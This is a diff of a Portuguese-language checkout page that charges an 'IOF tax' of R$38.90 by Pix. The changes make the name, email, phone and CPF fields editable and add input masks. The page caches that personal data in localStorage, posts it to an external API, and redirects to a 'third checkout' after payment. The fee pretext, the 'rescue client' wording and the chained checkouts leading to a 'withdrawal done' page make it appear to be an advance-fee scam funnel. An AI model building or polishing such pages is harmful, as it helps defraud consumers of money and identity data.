@@ -7,7 +7,7 @@
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
     
-    /* ESTILO DA PÁGINA (IDÊNTICO AO SEU PRINT) */
+    /* ESTILO DA PÁGINA */
     .iof-container {
         max-width: 450px;
         margin: 0 auto;
@@ -26,10 +26,24 @@
     .progress-bar-container { display: flex; height: 6px; background: #eee; border-radius: 4px; margin-bottom: 25px; overflow: hidden; }
     .progress-bar-fill { width: 50%; background: #f05a28; }
     
-    /* FORMULÁRIO */
+    /* FORMULÁRIO (AGORA EDITÁVEL) */
     .form-group { margin-bottom: 15px; text-align: left; }
     .form-group label { display: block; font-size: 12px; color: #333; font-weight: 700; margin-bottom: 5px; }
-    .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; color: #333; background: #fff; outline: none; }
+    .form-group input { 
+        width: 100%; 
+        padding: 12px; 
+        border: 1px solid #ddd; 
+        border-radius: 4px; 
+        font-size: 14px; 
+        color: #333; 
+        background: #fff; 
+        outline: none; 
+        transition: 0.3s;
+    }
+    .form-group input:focus {
+        border-color: #f05a28;
+        box-shadow: 0 0 5px rgba(240, 90, 40, 0.2);
+    }
     
     /* CAIXA DE RESUMO */
     .summary-box { border: 1px dashed #ccc; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fafafa; }
@@ -52,8 +66,8 @@
     .modal-pix h3 { color: #28a745; margin-bottom: 5px; font-size: 18px; }
     .modal-pix p { color: #666; font-size: 13px; margin-bottom: 15px; }
     #qr_code_div img { width: 200px; height: 200px; margin: 0 auto 15px auto; border-radius: 8px; border: 1px solid #eee; padding: 5px; }
-    .input-copia { width: 100%; padding: 12px; background: #f4f5f7; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; margin-bottom: 15px; outline: none; }
-    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: 700; cursor: pointer; }
+    .input-copia { width: 100%; padding: 12px; background: #f4f5f7; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; margin-bottom: 15px; outline: none; text-align: center;}
+    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: 700; cursor: pointer; transition: 0.3s;}
 </style>
 </head>
 <body>
@@ -76,19 +90,19 @@
 
     <div class="form-group">
         <label>Nome Completo</label>
-        <input type="text" id="iof_nome" readonly>
+        <input type="text" id="iof_nome" placeholder="Digite seu nome completo">
     </div>
     <div class="form-group">
         <label>E-mail</label>
-        <input type="text" id="iof_email" readonly>
+        <input type="email" id="iof_email" placeholder="seuemail@email.com">
     </div>
     <div class="form-group">
         <label>Celular</label>
-        <input type="text" id="iof_phone" readonly>
+        <input type="text" id="iof_phone" placeholder="(00) 00000-0000" maxlength="15">
     </div>
     <div class="form-group">
-        <label>CPF (Apenas números)</label>
-        <input type="text" id="iof_cpf" readonly>
+        <label>CPF</label>
+        <input type="text" id="iof_cpf" placeholder="000.000.000-00" maxlength="14">
     </div>
 
     <div class="summary-box">
@@ -131,36 +145,67 @@
     // ==========================================================
     const API_URL = "https://checkoutfinal.onrender.com"; 
     
-    // 🔴 COLOQUE AQUI O LINK DA SUA ÚLTIMA PÁGINA (Ex: Saque Realizado)
-    const PROXIMA_ETAPA = "https://SEU_SITE.com/pagina-final-concluida"; 
+    // 🔴 MUITO IMPORTANTE: COLOQUE AQUI O LINK DO SEU TERCEIRO CHECKOUT!
+    const PROXIMA_ETAPA = "https://SEU_SITE.com/terceiro-checkout"; 
 
-    // Pega dados da URL para preencher os campos do formulário
-    function getURLParameter(name) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(name);
-    }
-
-    // Preenche os campos assim que a página carrega
+    // ==========================================================
+    // AUTO-PREENCHIMENTO E MÁSCARAS
+    // ==========================================================
     window.onload = function() {
-        document.getElementById("iof_nome").value = getURLParameter('nome') || "Cliente Resgate";
-        document.getElementById("iof_email").value = getURLParameter('email') || "cliente@email.com";
-        document.getElementById("iof_phone").value = getURLParameter('phone') || "(11) 99999-9999";
-        document.getElementById("iof_cpf").value = getURLParameter('cpf') || "00000000000";
+        const local = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+        const params = new URLSearchParams(window.location.search);
+
+        // Puxa da URL primeiro. Se não tiver, tenta a Memória. Se não tiver, deixa em branco pro cliente.
+        document.getElementById("iof_nome").value = params.get('nome') || local.nome || "";
+        document.getElementById("iof_email").value = params.get('email') || local.email || "";
+        document.getElementById("iof_cpf").value = params.get('cpf') || local.cpf || local.documento || "";
+        document.getElementById("iof_phone").value = params.get('phone') || params.get('celular') || local.telefone || local.celular || "";
     };
 
+    // Máscaras para formatar caso o cliente resolva apagar e digitar de novo
+    document.getElementById('iof_cpf').addEventListener('input', function(e){
+        let v = e.target.value.replace(/\D/g,'');
+        v = v.replace(/(\d{3})(\d)/,'$1.$2');
+        v = v.replace(/(\d{3})(\d)/,'$1.$2');
+        v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+        e.target.value = v;
+    });
+
+    document.getElementById('iof_phone').addEventListener('input', function(e){
+        let v = e.target.value.replace(/\D/g,'');
+        v = v.replace(/^(\d{2})(\d)/g,'($1) $2');
+        v = v.replace(/(\d{5})(\d{4})$/,'$1-$2');
+        e.target.value = v;
+    });
+
+    // ==========================================================
+    // GERAÇÃO DO PIX
+    // ==========================================================
     function gerarPixIOF() {
         const btn = document.getElementById("btn_pagar");
+        
+        // Validação rápida para ver se o cliente não apagou tudo sem querer
+        if(!document.getElementById("iof_nome").value || !document.getElementById("iof_cpf").value) {
+            alert("Por favor, preencha os dados corretamente.");
+            return;
+        }
+
         btn.innerHTML = "PROCESSANDO...";
         btn.disabled = true;
 
-        // VALOR EXATO DO SEU PRINT PARA A VIZZION PAY
+        // VALOR EXATO DA TAXA IOF: 38,90
         const payload = {
             name: document.getElementById("iof_nome").value,
             email: document.getElementById("iof_email").value,
-            phone: document.getElementById("iof_phone").value,
-            cpf: document.getElementById("iof_cpf").value,
+            phone: document.getElementById("iof_phone").value.replace(/\D/g, ''),
+            cpf: document.getElementById("iof_cpf").value.replace(/\D/g, ''),
             valor: "38.90" 
         };
+        
+        // Salva os dados mais recentes na memória para a próxima página usar também
+        localStorage.setItem('dadosUsuario', JSON.stringify({
+            nome: payload.name, email: payload.email, cpf: payload.cpf, telefone: payload.phone
+        }));
 
         fetch(`${API_URL}/pix`, {
             method: "POST",
@@ -174,30 +219,33 @@
                 document.getElementById("overlay").style.display = "block";
                 document.getElementById("modal_pix").style.display = "block";
                 
-                // PREENCHE QR CODE E CÓDIGO (À prova de falhas)
+                // PREENCHE QR CODE E CÓDIGO 
                 document.getElementById("txt_codigo").value = data.payload;
                 document.getElementById("img_qr").src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}`;
 
                 // ==========================================================
-                // MONITORAMENTO (VERIFICA O PAGAMENTO E PULA DE PÁGINA)
+                // MONITORAMENTO (REDIRECIONAMENTO AUTOMÁTICO - POLLING)
                 // ==========================================================
                 const monitoramento = setInterval(() => {
                     fetch(`${API_URL}/check-status/${data.transactionId}`)
                     .then(r => r.json())
                     .then(resStatus => {
                         if(resStatus.paid === true) {
-                            clearInterval(monitoramento);
-                            document.getElementById('status_msg').innerText = "🚀 Pagamento aprovado! Finalizando...";
+                            clearInterval(monitoramento); // Para o cronômetro
+                            
+                            // Avisa na tela que deu certo!
+                            document.getElementById('status_msg').innerText = "🚀 Pagamento aprovado! Preparando próxima etapa...";
                             document.getElementById('status_msg').style.color = "#28a745";
                             document.getElementById('status_msg').style.fontWeight = "bold";
                             
+                            // Pula para a próxima página (Checkout Final)
                             setTimeout(() => {
                                 window.location.href = PROXIMA_ETAPA;
                             }, 1500);
                         }
                     })
-                    .catch(err => console.log("Aguardando..."));
-                }, 3000);
+                    .catch(err => console.log("Aguardando banco..."));
+                }, 3000); // Consulta a cada 3 segundos
 
             } else {
                 alert("Erro ao conectar com banco. Tente novamente.");
@@ -212,6 +260,9 @@
         });
     }
 
+    // ==========================================================
+    // FUNÇÃO COPIAR MELHORADA
+    // ==========================================================
     function copiarCodigo() {
         const copyText = document.getElementById("txt_codigo");
         copyText.select();
@@ -220,11 +271,11 @@
         
         const btnCopy = document.getElementById('btn_copy');
         btnCopy.innerText = "✅ CÓDIGO COPIADO!";
-        btnCopy.style.background = "#1e7e34";
+        btnCopy.style.background = "#1e7e34"; // Fica um verde mais escuro confirmando
         
         setTimeout(() => {
             btnCopy.innerText = "COPIAR CÓDIGO PIX";
-            btnCopy.style.background = "#28a745";
+            btnCopy.style.background = "#28a745"; // Volta pro original
         }, 3000);
     }
 </script>
